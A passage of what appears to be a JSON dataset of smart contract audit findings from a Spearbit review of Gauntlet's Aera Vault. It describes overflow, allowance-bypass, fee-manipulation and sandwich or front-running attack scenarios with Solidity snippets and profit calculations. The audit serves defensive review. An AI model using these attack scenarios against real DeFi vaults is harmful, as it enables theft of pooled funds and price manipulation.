console.log(\"AllowlistLP\", decodeUint31(miscData, decodeBool(miscData, decodeUint31(miscData, decodeBool(miscData, _FEE_START_TIME_OFFSET)); // 5 _SWAP_ENABLED_OFFSET)); // true _FEE_END_TIME_OFFSET)); // 6 _MUST_ALLOWLIST_LPS_OFFSET)); // ,! true console.log(\"Swap fee percentage\", console.log(\"Swap fee percentage\", decodeUint64(poolState, _SWAP_FEE_PERCENTAGE_OFFSET)); // 7 _SWAP_FEE_PERCENTAGE_OFFSET)); // 0 decodeUint64(miscData, due to miscData conversion } ,! }", "labels": ["Spearbit", "Gauntlet", "Severity: Critical Risk"]}, {"title": "sweep function should prevent Treasury from withdrawing pools BPTs", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The current sweep() implementation allows the vault owner (the Treasury) to sweep any token owned by the vault including BPTs (Balancer Pool Tokens) that have been minted by the Vault during the pools initialDeposit() function call. The current vault implementation does not need those BPTs to withdraw funds because they are passed directly through the AssetManager flow via withdraw()/finalize(). Being able to withdraw BPTs would allow the Treasury to:  Withdraw funds without respecting the time period between initiateFinalization() and finalize() calls.  Withdraw funds without respecting Validator allowance() limits.  Withdraw funds without paying the managers fee for the last withdraw().  finalize the pool, withdrawing all funds and selling valueless BPTs on the market.  Sell or rent out BPTs and withdraw() funds afterwards, thus doubling the funds. Swap fees would not be paid because Treasury could call setManager(newManager), where the new manager is someone controlled by the Treasury, subsequently calling setSwapFee(0) to remove the swap fee, which would be applied during an exitPool() event. Note: Once the BPT is retrieved it can also be used to call exitPool(), as the mustAllowlistLPs check is ignored in exitPool().", "labels": ["Spearbit", "Gauntlet", "Severity: Critical Risk"]}, {"title": "Manager can cause an immediate weight change", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "Balancers ManagedPool uses 32 bit values for startTime and endTime but it does not verify if those values exist within that range. When endTime is set to 2**32 it becomes larger than startTime so the _require(startTime <= endTime, ...) statement will not revert. When endTime is converted to 32 bits it will get a value of 0, so in _calcu- lateWeightChangeProgress() the test if (currentTime >= endTime) ... will be true, causing the weight to immediately reach the end value. This way the Manager can cause an immediate weight change via the updateWeightsGradually() function and open arbitrage opportunities. Note: startTime is also subject to this overflow problem. Note: the same issues occur in the latest version of ManagedPool. Note: This issue has been reported to Balancer by the Spearbit team. 7 Also see the following issues:  Managed Pools are still undergoing development and may contain bugs and/or change significantly  Important fields of Balancer can be overwritten by EndTime contract ManagedPool is BaseWeightedPool, ReentrancyGuard { function updateWeightsGradually(uint256 startTime, uint256 endTime, ... ) { ... uint256 currentTime = block.timestamp; startTime = Math.max(currentTime, startTime); _require(startTime <= endTime, Errors.GRADUAL_UPDATE_TIME_TRAVEL); // will not revert if ,! endTime == 2**32 ... _startGradualWeightChange(startTime, endTime, _getNormalizedWeights(), endWeights, tokens); } function _startGradualWeightChange(uint256 startTime, uint256 endTime, ... ) ... { ... _setMiscData( _getMiscData().insertUint32(startTime, _START_TIME_OFFSET).insertUint32(endTime, ,! _END_TIME_OFFSET) ); // this convert the values to 32 bits ... } function _calculateWeightChangeProgress() private view returns (uint256) { uint256 currentTime = block.timestamp; bytes32 poolState = _getMiscData(); uint256 startTime = poolState.decodeUint32(_START_TIME_OFFSET); uint256 endTime = poolState.decodeUint32(_END_TIME_OFFSET); if (currentTime >= endTime) { // will be true if endTime == (2**32) capped to 32 bits == 0 return FixedPoint.ONE; } else ... ... } }", "labels": ["Spearbit", "Gauntlet", "Severity: High Risk"]}, {"title": "deposit and withdraw functions are susceptible to sandwich attacks", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "Transactions calling the deposit() function are susceptible to sandwich attacks where an attacker can extract value from deposits. A similar issue exists in the withdraw() function but the minimum check on the pool holdings limits the attacks impact. Consider the following scenario (swap fees ignored for simplicity): 1. Suppose the Balancer pool contains two tokens, WETH and DAI, and weights are 0.5 and 0.5. Currently, there is 1 WETH and 3k DAI in the pool and WETH spot price is 3k. 2. The Treasury wants to add another 3k DAI into the Aera vault, so it calls the deposit() function. 3. The attacker front-runs the Treasurys transaction. They swap 3k DAI into the Balancer pool and get out 0.5 WETH. The weights remain 0.5 and 0.5, but because WETH and DAI balances become 0.5 and 6k, WETHs spot price now becomes 12k. 4. Now, the Treasurys transaction adds 3k DAI into the Balancer pool and upgrades the weights to 0.5*1.5: 0.5 = 0.6: 0.4. 5. The attacker back-runs the transaction and swaps the 0.5 WETH they got in step 3 back to DAI (and recovers the WETHs spot price to near but above 3k). According to the current weights, they can get 9k*(1 - 1/r) = 3.33k DAI from the pool, where r = (20.4)(1/0.6). 6. As a result the attacker profits 3.33k - 3k = 0.33k DAI.", "labels": ["Spearbit", "Gauntlet", "Severity: High Risk"]}, {"title": "allowance() doesnt limit withdraw()s", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The allowance() function is meant to limit withdraw amounts. However, allowance() can only read and not alter state because its visibility is set to view. Therefore, the withdraw() function can be called on demand until the entire Vault/Pool balance has been drained, rendering the allowance() function ineffective. function withdraw(uint256[] calldata amounts) ... { ... uint256[] memory allowances = validator.allowance(); ... for (uint256 i = 0; i < tokens.length; i++) { if (amounts[i] > holdings[i] || amounts[i] > allowances[i]) { revert Aera__AmountExceedAvailable(... ); } } } // can't update state due to view function allowance() external view override returns (uint256[] memory amounts) { amounts = new uint256[](count); for (uint256 i = 0; i < count; i++) { amounts[i] = ANY_AMOUNT; } } from both IWithdrawal-", "labels": ["Spearbit", "Gauntlet", "Severity: High Risk"]}, {"title": "Malicious manager could cause Vault funds to be inaccessible", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The calculateAndDistributeManagerFees() function pushes tokens to the manager and if for unknown reasons this action fails the entire Vault would be blocked and funds become inaccessible. This occurs because the following functions depend on the execution of calculateAndDistributeManagerFees(): deposit(), withdraw(), setManager(), claimManagerFees(), initiateFinalization(), and therefore final- ize() as well. Within calculateAndDistributeManagerFees() the function safeTransfer() is the riskiest and could fail under the following situations:  A token with a callback is used, for example an ERC777 token, and the callback is not implemented correctly.  A token with a blacklist option is used and the manager is blacklisted. For example USDC has such blacklist functionality. Because the manager can be an unknown party, a small risk exist that he is malicious and his address could be blacklisted in USDC. Note: set as high risk because although probability is very small, impact results in Vault funds to become inacces- sible. function calculateAndDistributeManagerFees() internal { ... for (uint256 i = 0; i < amounts.length; i++) { tokens[i].safeTransfer(manager, amounts[i]); } }", "labels": ["Spearbit", "Gauntlet", "Severity: High Risk"]}, {"title": "updateWeightsGradually allows change rates to start in the past with a very high maximumRatio", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The current updateWeightsGradually is using startTime instead of time that should be Math.max(block.timestamp, startTime). Because internally Balancer will use startTime = Math.max(currentTime, startTime); as the startTime, this allows to: the minimal start  Have a startTime in the past.  Have a targetWeights[i] higher than allowed. We also suggest adding another check to prevent startTime > endTime. Although Balancer replicates the same check it is still needed in the Aera implementation to prevent transactions to revert because of an underflow error on uint256 duration = endTime - startTime;", "labels": ["Spearbit", "Gauntlet", "Severity: High Risk"]}, {"title": "The vault manager has unchecked power to create arbitrage using setSwapFees", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "A previously known issue was that a malicious vault manager could arbitrage the vault like in the below scenario: 1. Set the swap fees to a high value by setSwapFee (10% is the maximum). 2. Wait for the market price to move against the spot price. 3. In the same transaction, reduce the swap fees to ~0 (0.0001% is the minimum) and arbitrage the vault. The proposed fix was to limit the percentage change of the swap fee to a maximum of MAXIMUM_SWAP_FEE_- PERCENT_CHANGE each time. However, because there is no restriction on how many times the setSwapFee function can be called in a block or transaction, a malicious manager can still call it multiple times in the same transaction and eventually set the swap fee to the value they want.", "labels": ["Spearbit", "Gauntlet", "Severity: High Risk"]}, {"title": "Implement a function to claim liquidity mining rewards", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "Balancer offers a liquidity mining rewards distribution for liquidity providers. Liquidity Mining distributions are available to claim weekly through the MerkleOrchard contract. Liquid- ity Providers can claim tokens from this contract by submitting claims to the tokens. These claims are checked against a Merkle root of the accrued token balances which are stored in a Merkle tree. Claim- ing through the MerkleOrchard is much more gas-efficient than the previous generation of claiming contracts, especially when claiming multiple weeks of rewards, and when claiming multiple tokens. The AeraVault is itself the only liquidity provider of the Balancer pool deployed, so each week its entitled to claim those rewards. Currently, those rewards cannot be claimed because the AeraVault is missing an implementation to interact with the MerkleOrchard contract, causing all rewards (BAL + other tokens) to remain in the MerkleOrchard forever.", "labels": ["Spearbit", "Gauntlet", "Severity: High Risk"]}, {"title": "Owner can circumvent allowance() via enableTradingWithWeights()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The vault Owner can set arbitrary weights via disableTrading() and then call enableTrading- WithWeights() to set the spot price and create arbitrage opportunities for himself. This way allowance() in withdraw() checks, which limit the amount of funds an owner can withdraw, can be circumvented. Something similar can be done with enableTradingRiskingArbitrage() in combination with sufficient time. Also see the following issues:  allowance() doesnt limit withdraw()s  enableTradingWithWeights allow the Treasury to change the pools weights even if the swap is not disabled  Separation of concerns Owner and Manager function disableTrading() ... onlyOwnerOrManager ... { setSwapEnabled(false); } function enableTradingWithWeights(uint256[] calldata weights) ... onlyOwner ... { ... pool.updateWeightsGradually(timestamp, timestamp, weights); setSwapEnabled(true); } function enableTradingRiskingArbitrage() ... onlyOwner ... { setSwapEnabled(true); } 13", "labels": ["Spearbit", "Gauntlet", "Severity: Medium Risk"]}, {"title": "Front-running attacks on finalize could affect received token amounts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The returnFunds() function (called by finalize()) withdraws the entire holdings in the Balancer pool but does not allow the caller to specify and enforce the minimum amount of received tokens. Without such check the finalize() function could be susceptible to a front-running attack. A potential exploit scenario looks as follows: 1. The notice period has passed and the Treasury calls finalize() on the Aera vault. Assume the Balancer pool contains 1 WETH and 3000 DAI, and that WETH and DAI weights are both 0.5. 2. An attacker front-runs the Treasurys transaction and swaps in 3000 DAI to get 0.5 WETH from the pool. 3. As an unexpected result, the Treasury receives 0.5 WETH and 6000 DAI. Therefore an attacker can force the Treasury to accept the trade that they offer. Although the Treasury can execute a reverse trade on another market to recover the token amount and distribution, not every Treasury can execute such trade (e.g., if a timelock controls it). Notice that the attacker may not profit from the swap because of slippage but they could be incentivized to perform such an attack if it causes considerable damage to the Treasury.", "labels": ["Spearbit", "Gauntlet", "Severity: Medium Risk"]}, {"title": "safeApprove in depositToken could revert for non-standard token like USDT", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "Some non-standard tokens like USDT will revert when a contract or a user tries to approve an al- lowance when the spender allowance has already been set to a non zero value. In the current code we have not seen any real problem with this fact because the amount retrieved via depositToken() is approved send to the Balancer pool via joinPool() and managePoolBalance(). Balancer transfers the same amount, lowering the approval to 0 again. However, if the approval is not lowered to exactly 0 (due to a rounding error or another unfore- seen situation) then the next approval in depositToken() will fail (assuming a token like USDT is used), blocking all further deposits. Note: Set to medium risk because the probability of this happening is low but impact would be high. We also should note that OpenZeppelin has officially deprecated the safeApprove function, suggesting to use instead safeIncreaseAllowance and safeDecreaseAllowance.", "labels": ["Spearbit", "Gauntlet", "Severity: Medium Risk"]}, {"title": "Consult with Balancer team about best approach to add and remove funds", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The Aera Vault uses AssetManagers functionality of function managePoolBalance() to add and remove funds. The standard way to add and remove funds in Balancer is via joinPool() / exitPool(). Using the managePoolBalance() function might lead to future unexpected behavior. Additionally, this disables the capacity to implement the original intention of AssetManagers functionality, e.g. storing funds elsewhere to generate yield.", "labels": ["Spearbit", "Gauntlet", "Severity: Medium Risk"]}, {"title": "Fee on transfer can block several functions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "Some tokens have a fee on transfer, for example USDT. Usually such fee is not enabled but could be re-enabled at any time. With this fee enabled the withdrawFromPool() function would receive slightly less tokens than the amounts requested from Balancer causing the next safeTransfer() call to fail because there are not enough tokens inside the contract. This means withdraw() calls will fail. Functions deposit() and calculateAndDistributeManagerFees() can also fail because they have similar code. Note: The function returnFunds() is more robust and can handle this problem. Note: The problem can be alleviated by sending additional tokens directly to the Aera Vault contract to compensate for fees, lowering the severity of the problem to medium. function withdraw(uint256[] calldata amounts) ... { ... withdrawFromPool(amounts); // could get slightly less than amount with a fee on transfer ... for (uint256 i = 0; i < amounts.length; i++) { if (amounts[i] > 0) { tokens[i].safeTransfer(owner(), amounts[i]); // could revert it the full amounts[i] isn't ,! available ... } ... } }", "labels": ["Spearbit", "Gauntlet", "Severity: Medium Risk"]}, {"title": "enableTradingWithWeights allow the Treasury to change the pools weights even if the swap is not disabled", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "enableTradingWithWeights is a function that can only be called by the owner of the Aera Vault contract and that should be used only to re-enable the swap feature on the pool while updating token weights. The function does not verify if the pools swap feature is enabled and for this reason, as a result, it allows the Treasury to act as the manager who is the only actor allowed to change the pool weights. The function should add a check to ensure that it is only callable when the pools swap is disabled.", "labels": ["Spearbit", "Gauntlet", "Severity: Medium Risk"]}, {"title": "AeraVault constructor is not checking all the input parameters", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The Aera Vault constructor has the role to handle Balancers ManagedPool deployment. The con- structor should increase the number of user input validation and the Gauntlet team should be aware of the possible edge case that could happen given that the deployment of the Aera Vault is handled directly by the Treasury and not by the Gauntlet team itself. We are going to list all the worst-case scenarios that could happen given the premise that the deployments are handled by the Treasury. 1. factory could be a wrapper contract that will deploy a ManagedPool. This would mean that the deployer could pass correct parameters to Aera Vault to pass these checks, but will use custom and malicious parameters on the factory wrapper to deploy the real Balancer pool. 2. swapFeePercentage value is not checked. On Balancer, the deployment will revert if the value is not in- side this range >= 1e12 (0.0001%) and <= 1e17 (10% - this fits in 64 bits). Without any check, the Gauntlet accept to follow the Balancers swap requirements. 3. manager_ is not checked. They could set the manager as the Treasury (owner of the vault) itself. This would give the Treasury the full power to manage the Vault. At least these values should be checked: address(0), address(this) or owner(). The same checks should also be done in the setManager() function. 4. validator_ could be set to a custom contract that will give full allowances to the Treasury. This would make the withdraw() act like finalize() allowing to withdraw all the funds from the vault/pool. 17 5. noticePeriod_ has only a max value check. Gauntlet team explained that a time delay between the ini- tialization of the finalize process and the actual finalize is needed to prevent the Treasury to be able to instantly withdraw all the funds. Not having a min value check allow the Treasury to set the value to 0 so there would be no delay between the initiateFinalization() and finalize() because noticeTimeoutAt == block.timestamp. 6. managementFee_ has no minimum value check. This would allow the Treasury to not pay the manager because the managerFeeIndex would always be 0. 7. description_ can be empty. From the Specification PDF, the description of the vault has the role to De- scribes vault purpose and modelling assumptions for differentiating between vaults. Being empty could lead to a bad UX for external services that needs to differentiate different vaults. These are all the checks that are done directly by Balancer during deployment via the Pool Factory:  BasePool constructor#L94-L95 min and max number of tokens.  BasePool constructor#L102token array is sorted following Balancer specification (sorted by token address).  BasePool constructor calling _setSwapFeePercentage min and max value for swapFeePercentage.  BasePool constructor calling vault.registerTokens token address uniqueness (cant have same Following the pathBasePool is calling from function _registerMinimalSwapInfoPoolTokens it also checks that token != IERC20(0). should call token in the pool), vault.registerTokens MinimalSwapInfoPoolsBalance. that  ManagedPool constructor calling _startGradualWeightChange Check min value of weight and that the total sum of the weights are equal to 100%. _startGradualWeightChange internally check that endWeight >= WeightedMath._MIN_WEIGHT and normalizedSum == FixedPoint.ONE.", "labels": ["Spearbit", "Gauntlet", "Severity: Medium Risk"]}, {"title": "Possible mismatch between Validator.count and AeraVault assets count", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "A weak connection between WithdrawalValidator and Aera Vault could lead to the inability of withdrawing from a Vault. Consider the following scenario: The Validator is deployed with a tokenCount < than Vault.getTokens().length. Inside the withdraw() function we reference the following code block: uint256[] memory allowances = validator.allowance(); uint256[] memory weights = getNormalizedWeights(); uint256[] memory newWeights = new uint256[](tokens.length); for (uint256 i = 0; i < tokens.length; i++) { if (amounts[i] > holdings[i] || amounts[i] > allowances[i]) { revert Aera__AmountExceedAvailable( address(tokens[i]), amounts[i], holdings[i].min(allowances[i]) ); } } A scenario where allowances.length < tokens.length would cause this function to revert with an Index out of bounds error. The only way for the Treasury to withdraw funds would be via the finalize() method which has a time delay.", "labels": ["Spearbit", "Gauntlet", "Severity: Medium Risk"]}, {"title": "Ensure vaults deployment integrity", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The treasury could deploy on purpose or by accident a slightly different version of the contract and introduce bugs or backdoors. This might not be recognized by parties taking on Manager responsibilities (e.g. usually Gauntlet will be involved here).", "labels": ["Spearbit", "Gauntlet", "Severity: Low Risk"]}, {"title": "Frequent calling of calculateAndDistributeManagerFees() lowers fees", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "Via calculateAndDistributeManagerFees() a percentage of the Pool is subtracted and sent to the Manager. If this function is called too frequently his fees will be lower. For example:  If he calls it twice, while both time getting 1%, he actually gets: 1% + 1% * (100% - 1%) = 1.99%  If he waits longer until he has earned 2%, he actually gets: 2%, which is slightly more than 1.99%  If called very frequently the fees go to 0 (especially taking in account the rounding down). However the gas cost would be very high. The Manager can (accidentally) do this by calling claimManagerFees(). The Owner can (accidentally or on pur- pose (e.g. using 0 balance change) ) do this by calling deposit(), withdraw() or setManager(). Note: Rounding errors make this slightly worse. Also see the following issue: Possible rounding down of fees function claimManagerFees() ... { calculateAndDistributeManagerFees(); // get a percentage of the Pool }", "labels": ["Spearbit", "Gauntlet", "Severity: Low Risk"]}, {"title": "OpenZeppelin best practices", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The Aera Vault uses OpenZeppelin release 4.3.2 which is copied into their github. The current release of OpenZeppelin is 4.6.0 and includes several updates and security fixes. The copies of the OpenZeppelin files are also (manually) changed to adapt the import paths. This has the risk of making a mistake in the process. import \"./dependencies/openzeppelin/SafeERC20.sol\"; import \"./dependencies/openzeppelin/IERC20.sol\"; import \"./dependencies/openzeppelin/IERC165.sol\"; import \"./dependencies/openzeppelin/Ownable.sol\"; import \"./dependencies/openzeppelin/ReentrancyGuard.sol\"; import \"./dependencies/openzeppelin/Math.sol\"; import \"./dependencies/openzeppelin/SafeCast.sol\"; import \"./dependencies/openzeppelin/ERC165Checker.sol\";", "labels": ["Spearbit", "Gauntlet", "Severity: Low Risk"]}, {"title": "Possible rounding down of fees", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "If certain token has a few decimals numbers then fees could be rounded down to 0, especially if time between calculateAndDistributeManagerFees() is relatively small. This also could slightly shift the spot price because the balance of one coin is lowered while the other remains still. With fewer decimals the situation worsens, e.g. Gemini USD GUSD has 2 decimals, therefore the problem occurs with a balance of 10_000 GUSD. Note: The rounding down is probably neglectable in most cases. function calculateAndDistributeManagerFees() internal { ... for (uint256 i = 0; i < tokens.length; i++) { amounts[i] = (holdings[i] * managerFeeIndex) / ONE; // could be rounded down to 0 } ... } With 1 USDC in the vault and 2 hours between calculateAndDistributeManagerFees(), the fee for USDC is rounded down to 0. This behavior is demonstrated in the following POC: 21 import \"hardhat/console.sol\"; contract testcontract { uint256 constant ONE = 10**18; uint managementFee = 10**8; constructor() { // MAX_MANAGEMENT_FEE = 10**9; // 1 USDC uint holdings = 1E6; uint delay = 2 hours; uint managerFeeIndex = delay * managementFee; uint amounts = (holdings * managerFeeIndex) / ONE; console.log(\"Fee\",amounts); // fee is 0 } }", "labels": ["Spearbit", "Gauntlet", "Severity: Low Risk"]}, {"title": "Missing nonReentrant modifier on initiateFinalization(), setManager() and claimManagerFees() functions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The initiateFinalization() function is missing a nonReentrant modifier while calculateAnd- DistributeManagerFees() executes external calls. Same goes for setManager() and claimManagerFees() func- tions.", "labels": ["Spearbit", "Gauntlet", "Severity: Low Risk"]}, {"title": "Potential division by 0", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "If the balance (e.g. holdings[]) of a token is 0 in deposit() then the dividing by holdings[] would cause a revert. Note: Function withdraw() has similar code but when holdings[]==0 its not possible to withdraw() anyway. Note: The current Mannon vault code will not allow the balances to be 0. Note: Although not used in the current code, in order to do a deregisterTokens(), Balancer requires the balance to be 0. Additionally, refer to the following Balancer documentation about the-vault#deregistertokens. The worst case scenario is deposit() not working. function deposit(uint256[] calldata amounts) ... { ... for (uint256 i = 0; i < amounts.length; i++) { if (amounts[i] > 0) { depositToken(tokens[i], amounts[i]); uint256 newBalance = holdings[i] + amounts[i]; newWeights[i] = (weights[i] * newBalance) / holdings[i]; // would revert if holdings[i] == 0 } ... ... } Similar divisions by 0 could occur in getWeightChangeRatio(). The function is called from updateWeightsGradu- ally(). If this is due to targetWeight being 0, then it is the desired result. Current weight should not be 0 due balancer checks. function getWeightChangeRatio(uint256 weight, uint256 targetWeight) ... { return weight > targetWeight ? (ONE * weight) / targetWeight : (ONE * targetWeight) / weight; // could revert if targetWeight == 0 // could revert if weight== 0 }", "labels": ["Spearbit", "Gauntlet", "Severity: Low Risk"]}, {"title": "Use ManagedPoolFactory instead of BaseManagedPoolFactory to deploy the Balancer pool", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "Currently the Aera Vault is using BaseManagedPoolFactory as the factory to deploy the Balancer pool while Balancers documentation recommends and encourages the usage of ManagedPoolFactory. Quoting the doc inside the BaseManagedPoolFactory: This is a base factory designed to be called from other factories to deploy a ManagedPool with a particular controller/owner. It should NOT be used directly to deploy ManagedPools without controllers. ManagedPools controlled by EOAs would be very dangerous for LPs. There are no restrictions on what the managers can do, so a malicious manager could easily manipulate prices and drain the pool. In this design, other controller-specific factories will deploy a pool controller, then call this factory to deploy the pool, passing in the controller as the owner. 23", "labels": ["Spearbit", "Gauntlet", "Severity: Low Risk"]}, {"title": "Adopt the two-step ownership transfer pattern", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "To prevent the Aera vault Owner, i.e. the Treasury, from calling renounceOwnership() and effec- tively breaking vault critical functions such as withdraw() and finalize(), the renounceOwnership() function is explicitly overridden to revert the transaction every time. However, the transferOwnership() function may also lead to the same issue if the ownership is transferred to an uncontrollable address because of human errors or attacks on the Treasury.", "labels": ["Spearbit", "Gauntlet", "Severity: Low Risk"]}, {"title": "Implement zero-address check for manager_", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "Non-existent zero-address checks inside the constuctor for the manager_ parameter. If manager_- becomes a zero address then calls to calculateAndDistributeManagerFees will burn tokens (transfer them to address(0)).", "labels": ["Spearbit", "Gauntlet", "Severity: Low Risk"]}, {"title": "Simplify tracking of managerFeeIndex", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The calculateAndDistributeManagerFees() function uses updateManagerFeeIndex() to keep track of management fees. It keeps track of both managerFeeIndex and lastFeeCheckpoint in storage vari- ables (e.g. costing SLOAD/SSTORE). However, because managementFee is immutable this can be simplified to one storage variable, saving gas and improving code legibility. uint256 public immutable managementFee; // can't be changed function calculateAndDistributeManagerFees() internal { updateManagerFeeIndex(); ... if (managerFeeIndex == 0) { return; use managerFeeIndex } ... // ... managerFeeIndex = 0; ... } function updateManagerFeeIndex() internal { managerFeeIndex += (block.timestamp - lastFeeCheckpoint) * managementFee; lastFeeCheckpoint = block.timestamp.toUint64(); }", "labels": ["Spearbit", "Gauntlet", "Severity: Gas Optimization"]}, {"title": "Directly call getTokensData() from returnFunds()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The function returnFunds() calls getHoldings() and getTokens(). Both functions call getTokens- Data() thus waste gas unnecessarily. function returnFunds() internal returns (uint256[] memory amounts) { uint256[] memory holdings = getHoldings(); IERC20[] memory tokens = getTokens(); ... } function getHoldings() public view override returns (uint256[] memory amounts) { (, amounts, ) = getTokensData(); } function getTokens() public view override returns (IERC20[] memory tokens) { (tokens, , ) = getTokensData(); }", "labels": ["Spearbit", "Gauntlet", "Severity: Gas Optimization"]}, {"title": "Change uint32 and uint64 to uint256", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The contract contains a few variables/constants that are smaller than uint256: noticePeriod, no- ticeTimeoutAt and lastFeeCheckpoint. This doesnt actually save gas because they are not part of a struct and still take up a storage slot. It even costs more gas because additional bits have to be stripped off. Additionally, there is a very small risk of lastFeeCheckpoint wrapping to 0 in the updateManagerFeeIndex() function. If that would happen, managerFeeIndex would get far too large and too many fees would be paid out. Finally, using int256 simplifies the code. contract AeraVaultV1 is IAeraVaultV1, Ownable, ReentrancyGuard { ... uint32 public immutable noticePeriod; ... uint64 public noticeTimeoutAt; ... uint64 public lastFeeCheckpoint = type(uint64).max; ... } function updateManagerFeeIndex() internal { managerFeeIndex += (block.timestamp - lastFeeCheckpoint) * managementFee; // could get large when lastFeeCheckpoint wraps lastFeeCheckpoint = block.timestamp.toUint64(); }", "labels": ["Spearbit", "Gauntlet", "Severity: Gas Optimization"]}, {"title": "Use block.timestamp directly instead of assigning it to a temporary variable.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "It is preferable to use block.timestamp directly in your code instead of assigning it to a temporary variable as it only uses 2 gas.", "labels": ["Spearbit", "Gauntlet", "Severity: Gas Optimization"]}, {"title": "Consider replacing pool.getPoolId() with bytes32 public immutable poolId to save gas and ex- ternal calls", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The current implementation of Aera Vault always calls pool.getPoolId() or indirectly getPoolId() to retrieve the ID of the immutable state variable pool that has been declared at constructor time. The pool.getPoolId() is a getter function defined in the Balancer BasePool contract: function getPoolId() public view override returns (bytes32) { return _poolId; } Inside the same BasePool contract the _poolId is defined as immutable which means that after creating a pool it will never change. For this reason it is possible to apply the same logic inside the Aera Vault and use an immutable variable to avoiding external calls and save gas.", "labels": ["Spearbit", "Gauntlet", "Severity: Gas Optimization"]}, {"title": "Save values in temporary variables", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "We observed multiple occurrences in the codebase where <var>.length was used in for loops. This could lead to more gas consumption as .length gets called repetitively until the for loop finishes. When indexed variables are used multiple times inside the loop in a read only way these can be stored in a temporary variable to save some gas. for (uint256 i = 0; i < tokens.length; i++) { // tokens.length has to be calculated repeatedly ... ... = tokens[i].balanceOf(...); tokens[i].safeTransfer(owner(), ...); } // tokens[i] has to be evaluated multiple times", "labels": ["Spearbit", "Gauntlet", "Severity: Gas Optimization"]}, {"title": "Aera could be prone to out-of-gas transaction revert when managing a high number of tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The Balancer ManagedPool used by Aera has a max limit of 50 token. Functions like: initialDeposit(), deposit(), withdraw() and finalize() involve numerous external direct and indirect (made by Balancer itself when called by Aera) calls and math calculations that are done for each token managed by the pool. The functions deposit() and withdraw() are especially gas intensive, given that they also internally call calcu- lateAndDistributeManagerFees() that will transfer, for each token, a management fee to the manager. For these reasons Aera should be aware that a high number of tokens managed by the Aera Vault could lead to out-of-gas reverts (max block size depends on which chain the project will be deployed).", "labels": ["Spearbit", "Gauntlet", "Severity: Informational"]}, {"title": "Use a consistent way to call getNormalizedWeights()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "The functions deposit() and withdraw() call function getNormalizedWeights() while the function updateWeightsGradually() and cancelWeightUpdates() call pool.getNormalizedWeights(). Although this is functionally the same, it is not consistent. 29 function deposit(uint256[] calldata amounts) ... { ... uint256[] memory weights = getNormalizedWeights(); ... emit Deposit(amounts, getNormalizedWeights()); } function withdraw(uint256[] calldata amounts) ... { ... uint256[] memory weights = getNormalizedWeights(); ... emit Withdraw(amounts, allowances, getNormalizedWeights()); } function updateWeightsGradually(...) ... { ... uint256[] memory weights = pool.getNormalizedWeights(); ... } function cancelWeightUpdates() ... { ... uint256[] memory weights = pool.getNormalizedWeights(); ... } function getNormalizedWeights() ... { return pool.getNormalizedWeights(); }", "labels": ["Spearbit", "Gauntlet", "Severity: Informational"]}, {"title": "Add function disableTrading() to IManagerAPI.sol", "html_url": 